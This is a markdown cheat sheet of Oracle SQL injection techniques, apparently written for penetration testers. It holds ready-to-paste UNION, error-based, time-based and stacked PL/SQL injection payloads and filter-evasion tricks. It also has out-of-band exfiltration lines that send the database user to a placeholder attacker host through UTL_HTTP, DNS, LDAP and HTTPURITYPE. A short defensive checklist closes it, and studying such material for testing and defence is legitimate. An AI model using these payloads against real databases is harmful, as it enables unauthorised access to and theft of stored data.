# Oracle Database — SQLi Notes

> Practical notes for testing and defending **Oracle (11g → 23c)**. Focus: fingerprinting, catalogs, UNION/stacking quirks, delay/OOB primitives, privileges/ACLs, and safe engineering guidance.

---

## 1) Quick Fingerprinting
- **Engine & version**
  - `SELECT banner FROM v$version WHERE ROWNUM=1;`
  - `SELECT * FROM product_component_version;`
- **Identity & context**
  - `SELECT user FROM dual;`
  - `SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;`
  - `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;`
  - `SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual;`

**Note:** Access to `v$*` views depends on roles (`SELECT_CATALOG_ROLE` etc.). Prefer `SYS_CONTEXT` when possible.

---

## 2) Comments, Quoting, Concatenation
- **Comments:** `--`, `/* ... */`.
- **Strings:** `'text'`; escape with doubled `''`.
- **Alternative quoting:** `q'[text with 'quotes']'` (and other delimiters).
- **Concat:** `||`; cast with `TO_CHAR` / `CAST(... AS VARCHAR2(n))`.

---

## 3) System Catalogs & Info Views
- **User‑scoped:** `USER_TABLES`, `USER_TAB_COLUMNS`, `USER_VIEWS`, `USER_OBJECTS`.
- **All‑visible:** `ALL_TABLES`, `ALL_TAB_COLUMNS`, `ALL_VIEWS`, `ALL_OBJECTS`.
- **DBA‑wide:** `DBA_*` (require DBA privileges).

**Handy queries**
```sql
SELECT table_name FROM user_tables;
SELECT column_name, data_type FROM user_tab_columns WHERE table_name='USERS';
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name, column_name FROM all_tab_columns WHERE table_name='USERS';
```

---

## 4) UNION‑based Notes
- `FROM dual` often needed for constants:
```sql
' UNION ALL SELECT 1, user, 3 FROM dual -- -
```
- Column **count/types** must match; use `TO_CHAR` to normalize.
- Pagination: `FETCH FIRST n ROWS ONLY` / `OFFSET` (12c+), otherwise `ROWNUM`.


---

## 5) Error‑based Notes
- Oracle rarely echoes attacker text. Use errors to confirm injection surface:
```sql
' AND to_char(1/0) -- -      -- ORA‑01476
' AND TO_NUMBER('abc') -- -  -- ORA‑01722
```

---

## 6) Time‑based Primitives
- `DBMS_LOCK.SLEEP(n)` (privileged).
- `DBMS_PIPE.RECEIVE_MESSAGE('chan', n)` (often usable).

```sql
' AND dbms_lock.sleep(3) -- -
' AND dbms_pipe.receive_message('a',3) -- -
```

---

## 7) OOB Primitives & Network ACLs
- HTTP: `UTL_HTTP.REQUEST('http://attacker/p?x='||user)`
- DNS: `UTL_INADDR.GET_HOST_ADDRESS(user||'.attacker.tld')`
- LDAP/other: `DBMS_LDAP.INIT('attacker.tld',389)`
- `HTTPURITYPE('http://attacker/p?x='||user).getCLOB()`
**Controlled by Network ACLs (11g+); absence → `ORA-24247`**.

---

## 8) Stacked & PL/SQL Blocks
- Use `BEGIN ... END;` for multi‑step logic:
```sql
'; BEGIN dbms_lock.sleep(3); END;--
'; DECLARE x VARCHAR2(64); BEGIN SELECT user INTO x FROM dual; NULL; END;--
```

---

## 9) Aggregation & Helpers
- `LISTAGG(expr, ',') WITHIN GROUP (ORDER BY expr)` (12c+).
- Legacy: `XMLAGG` trick; prefer LISTAGG when available.
- `'` is `CHR(39)` for no‑quotes builders.

---

## 10) Privileges & Posture
```sql
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;
```
Avoid granting `EXECUTE` on network/file packages to app users; avoid `CREATE ANY DIRECTORY` unless required.

---

## 11) Evasion Tips
- Alternative quoting: `q'[...]'`.
- Mixed case/comment splitting: `dbms_/**/lock.sleep`.
- Builders with `CHR()`/`||` to avoid quotes.

---

## 12) Defensive Checklist
- Bind variables (prepared statements) everywhere.
- Use `DBMS_ASSERT` for identifier validation.
- Lock down **Network ACLs** (deny by default).
- Restrict dangerous packages for app schemas.
- Centralize errors; generic client responses.

---

## 13) Handy One‑liners
```sql
SELECT banner FROM product_component_version WHERE ROWNUM=1;
SELECT user, SYS_CONTEXT('USERENV','CURRENT_SCHEMA'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
' AND CASE WHEN (SELECT user FROM dual)='SYS' THEN dbms_pipe.receive_message('a',3) ELSE 0 END=0 -- -
```
